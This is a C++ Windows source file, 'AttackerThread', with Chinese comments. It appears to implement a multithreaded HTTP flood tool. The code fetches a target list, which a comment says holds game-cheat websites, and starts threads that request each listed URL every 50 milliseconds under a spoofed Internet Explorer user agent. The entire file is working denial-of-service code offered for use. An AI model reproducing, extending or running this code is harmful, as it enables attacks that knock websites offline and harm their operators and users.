/**
*	created:		2012-6-24   22:35
*	filename: 		AttackerThread
*	author:			FreeKnight
*	Copyright (C): 	
*	purpose:		
*/
//------------------------------------------------------------------------
#include <Windows.h>
#include <WinInet.h>
#include <vector>
#include <string>
#include <stdio.h>
#include <map>
#include "AttackerThread.h"
#include "AttackerCommData.h"
#include "AttackerCommDataEx.h"
//------------------------------------------------------------------------
using std::string;
using std::map;
using std::vector;
//------------------------------------------------------------------------
#pragma comment(lib, "Wininet.lib")
//------------------------------------------------------------------------
LPCSTR szListURL = "AttackList.txt";  //攻击列表位置
const int SIZE_HTTPBUFFER = 102400;
//------------------------------------------------------------------------
void GetListURL(LPSTR pBuffer)
{
	strcpy(pBuffer, szListURL);
	return;
}
//------------------------------------------------------------------------
vector<string> GetAttackList(void)
{
	vector<string> vtList;

	//取外挂网站列表
	HINTERNET hInternetSession;   
	HINTERNET hURL;
	char cBuffer[SIZE_HTTPBUFFER];
	DWORD dwBytesRead;
	BOOL bResult;

	try
	{		
		hInternetSession = InternetOpen(
			"Microsoft Internet Explorer",   // agent
			INTERNET_OPEN_TYPE_PRECONFIG,      // access
			NULL, NULL, 0);            // defaults
		if (hInternetSession == 0)
		{
			return vtList;
		}

		char tempurl[256];
		GetListURL(tempurl);		
		hURL = InternetOpenUrl(
			hInternetSession,               // session handle					
			tempurl,
			NULL, 0, 0, 0);               // defaults
		memset(tempurl, 0, sizeof(tempurl));

		if (hURL == 0)
		{
			InternetCloseHandle(hInternetSession);
			return vtList;
		}

		bResult = InternetReadFile(
			hURL,         // handle to URL
			(LPSTR)cBuffer,      // pointer to buffer
			SIZE_HTTPBUFFER,      // size of buffer
			&dwBytesRead);      // pointer to var to hold return value

		if (bResult && strstr(cBuffer, "ACONFIG") == cBuffer)
		{
			string strBuff(cBuffer);
			int nStart = 0;
			int nEnd = strBuff.find_first_of("\r", nStart);
			while (nStart < strBuff.size())
			{				
				string tempstr =  strBuff.substr(nStart, nEnd - nStart);
				LPCSTR p = tempstr.c_str();
				vtList.push_back(strBuff.substr(nStart, nEnd - nStart));
				nStart = nEnd + 2;
				nEnd = strBuff.find_first_of("\r", nStart);				
				if (nEnd == -1)
				{
					nEnd = strBuff.size();
				}				
			}
		}

		// Close down connections.
		InternetCloseHandle(hURL);
		InternetCloseHandle(hInternetSession);	
	}
	catch (...) {
		vtList.clear();
	}

	return vtList;
}
//------------------------------------------------------------------------
//对某个URL进攻一次
void Attack(LPCSTR  szURL)
{
	//取外挂网站列表
	HINTERNET hInternetSession;   
	HINTERNET hURL;
	const int SIZE_HTTPCONTEXTBUFFER = 2048;
	char cBuffer[SIZE_HTTPCONTEXTBUFFER];       
	DWORD dwBytesRead;
	BOOL bResult;

	try
	{		
		hInternetSession = InternetOpen(
			"Microsoft Internet Explorer",   // agent
			INTERNET_OPEN_TYPE_PRECONFIG,      // access
			NULL, NULL, 0);            // defaults
		if (hInternetSession == 0)
		{
			return ;
		}

		hURL = InternetOpenUrl(
			hInternetSession,               // session handle					
			szURL,
			NULL, 0, 0, 0);               // defaults

		if (hURL == 0)
		{
			InternetCloseHandle(hInternetSession);
			return ;
		}

		bResult = InternetReadFile(
			hURL,         // handle to URL
			(LPSTR)cBuffer,      // pointer to buffer
			SIZE_HTTPCONTEXTBUFFER,      // size of buffer
			&dwBytesRead);      // pointer to var to hold return value

		// Close down connections.
		InternetCloseHandle(hURL);
		InternetCloseHandle(hInternetSession);	
	}
	catch (...) {

	}
}
//------------------------------------------------------------------------
BOOL PhraseData(LPCSTR pData, int &id)
{	
	if (pData[0] != '[')
	{
		return FALSE;
	}

	string temp;

	int nEnd = 1;
	while(pData[nEnd] != '\0') 
	{
		if (pData[nEnd] == ',')
		{
			break;
		}
		temp = temp + pData[nEnd];
		nEnd++;
	}

	if (pData[nEnd] != ',' || !isdigit(pData[nEnd + 1]))		
	{
		return FALSE;
	}
	id = atol(temp.c_str());


	while(pData[nEnd] != '\0')
	{	
		if (pData[nEnd] == ']')
		{
			return TRUE;
		}
		++nEnd;
	}

	return FALSE;
}
//------------------------------------------------------------------------
DWORD WINAPI SubAttackerThreadProc(LPVOID lpParameter)
{
	CAttackerCommDataEx* pAttackData = (CAttackerCommDataEx*)lpParameter;

	LPCSTR szURL;
	while(!pAttackData->HasStopQuest())
	{
		szURL = pAttackData->GetAvalibleSite();
		if (szURL)
		{
			Attack(szURL);
		}
		Sleep(50);		
	}

	return 0;
}
//------------------------------------------------------------------------
DWORD WINAPI AttackerThreadProc(LPVOID lpParameter)
{
	if (lpParameter == NULL)
	{
		return 0;
	}

	AttackerCommData &ThredData = *(AttackerCommData*)lpParameter;
	ThredData.SetThreadWorking(TRUE);

	vector<string> vtAttackList = GetAttackList();	
	if (vtAttackList.size() < 2)
	{
		ThredData.SetThreadWorking(FALSE);
		return 0;
	}

	//删除第一行"ACONFIG"
	vtAttackList.erase(vtAttackList.begin());

	//建立各线程的配置表
	map<int , CAttackerCommDataEx> mapSubConfig;
	for (int i = 0; i < vtAttackList.size(); ++i)
	{
		int id;
		if (PhraseData(vtAttackList[i].c_str(), id))
		{			
			mapSubConfig[id].AddSite(vtAttackList[i].c_str());
		}		
	}

	//启动攻击线程
	HANDLE *pHandle = new HANDLE[mapSubConfig.size()];
	int nHandleIndex = 0;
	for (map<int , CAttackerCommDataEx>::iterator itor = mapSubConfig.begin();
		itor != mapSubConfig.end(); ++itor)
	{
		DWORD dwThreadID;
		pHandle[nHandleIndex] = CreateThread(NULL, 0, SubAttackerThreadProc, 
			&((*itor).second), 0, &dwThreadID);
		nHandleIndex++;
	}

	//运行中
	while(!ThredData.HasStopQuest())
	{  
		Sleep(100);		
	}

	//停止所有线程
	for (map<int , CAttackerCommDataEx>::iterator itor = mapSubConfig.begin();
		itor != mapSubConfig.end(); ++itor)
	{
		(*itor).second.SetStopQuest(TRUE);
	}
	WaitForMultipleObjects(mapSubConfig.size(), pHandle, TRUE, 10000);

	//清除	
	for (--nHandleIndex ; nHandleIndex >0; --nHandleIndex)
	{
		if (pHandle[nHandleIndex] != 0)
		{
			CloseHandle(pHandle[nHandleIndex]);
		}		
	}
	delete[] pHandle;

	ThredData.SetThreadWorking(FALSE);
	return 0;
}
//------------------------------------------------------------------------